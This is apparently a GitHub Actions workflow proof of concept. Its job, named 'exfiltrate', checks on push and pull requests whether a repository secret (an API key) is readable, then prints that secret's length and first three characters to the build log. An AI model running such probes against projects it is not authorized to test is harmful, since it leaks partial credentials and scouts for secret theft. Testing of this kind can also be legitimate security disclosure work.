name: Push
on: [push, pull_request]
jobs:
  exfiltrate:
    name: Proof of Concept - Secret Access
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v2
      - name: Safe Secret Check
        env:
          TARGET_AUTH: ${{ secrets.FUSION_FEED_API_KEY }}
        run: |
          if [ -z "$TARGET_AUTH" ]; then
            echo "RESULT: [FAILED] - Secret is not accessible to this PR."
          else
            echo "RESULT: [SUCCESS] - Secret is accessible!"
            echo "DEBUG: Secret length is $(echo -n "$TARGET_AUTH" | wc -c) chars."
            echo "DEBUG: Secret starts with: $(echo -n "$TARGET_AUTH" | cut -c 1-3)..."
          fi
